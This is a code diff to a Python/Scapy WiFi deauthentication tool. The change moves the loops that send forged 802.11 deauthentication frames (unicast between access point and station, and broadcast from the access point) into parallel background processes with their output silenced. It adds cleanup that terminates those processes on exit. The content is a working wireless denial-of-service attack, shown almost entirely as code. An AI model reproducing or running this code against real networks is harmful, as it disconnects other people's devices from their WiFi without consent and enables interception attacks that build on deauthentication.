@@ -12,6 +12,7 @@
 # check for protected management frames
 
 import argparse
+import multiprocessing
 from re import compile as re_compile
 from scapy.config import conf as scapy_conf
 from scapy.layers import dot11
@@ -116,38 +117,56 @@ def unicast_deauth(deauth_waves, deauth_socket, bssid_sta, bssid_ap, bssid_netwo
     '''unicast deauthentication'''
     
     try:
+        multiprocessing.Process(
+            target = unicast_deauth_process,
+            args = (deauth_waves, deauth_socket, bssid_sta, bssid_ap, bssid_network),
+        ).start()
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
-        for i in range(deauth_waves):
-            for i in range(DEAUTH_COUNT):
-                deauth_socket.send(
-                    dot11.RadioTap() /
-                    dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
-                    dot11.Dot11Deauth(reason = 7)
-                )
-            for i in range(DEAUTH_COUNT):
-                deauth_socket.send(
-                    dot11.RadioTap() /
-                    dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
-                    dot11.Dot11Deauth(reason = 7)
-                )
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
+
+def unicast_deauth_process(deauth_waves, deauth_socket, bssid_sta, bssid_ap, bssid_network):
+    '''unicast deauthentication parallelism'''
+    
+    sys.stderr = sys.stdout = None
+    for i in range(deauth_waves):
+        for i in range(DEAUTH_COUNT):
+            deauth_socket.send(
+                dot11.RadioTap() /
+                dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
+                dot11.Dot11Deauth(reason = 7)
+            )
+        for i in range(DEAUTH_COUNT):
+            deauth_socket.send(
+                dot11.RadioTap() /
+                dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
+                dot11.Dot11Deauth(reason = 7)
+            )
 
 def broadcast_deauth(deauth_waves, deauth_socket, bssid_ap, bssid_network):
     '''broadcast deauthentication'''
     
     try:
+        multiprocessing.Process(
+            target = broadcast_deauth_process,
+            args = (deauth_waves, deauth_socket, bssid_ap, bssid_network),
+        ).start()
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
-        for i in range(deauth_waves):
-            for i in range(DEAUTH_COUNT):
-                 deauth_socket.send(
-                    dot11.RadioTap() /
-                    dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
-                    dot11.Dot11Deauth(reason = 7)
-                )
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
+
+def broadcast_deauth_process(deauth_waves, deauth_socket, bssid_ap, bssid_network):
+    '''broadcast deauthentication parallelism'''
+    
+    sys.stderr = sys.stdout = None
+    for i in range(deauth_waves):
+        for i in range(DEAUTH_COUNT):
+                deauth_socket.send(
+                dot11.RadioTap() /
+                dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
+                dot11.Dot11Deauth(reason = 7)
+            )
 
 def sniffer_wrapper(wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, deauth_socket, bssids_aps_dict, bssids_stas_dict):
     def sniffer_handler(frame):
@@ -275,6 +294,8 @@ def main():
         panic(MsgException(e))
     finally:
         try:
+            for child in multiprocessing.active_children():
+                child.terminate()
             deauth_socket.close()
         except:
             sys.exit(-1)
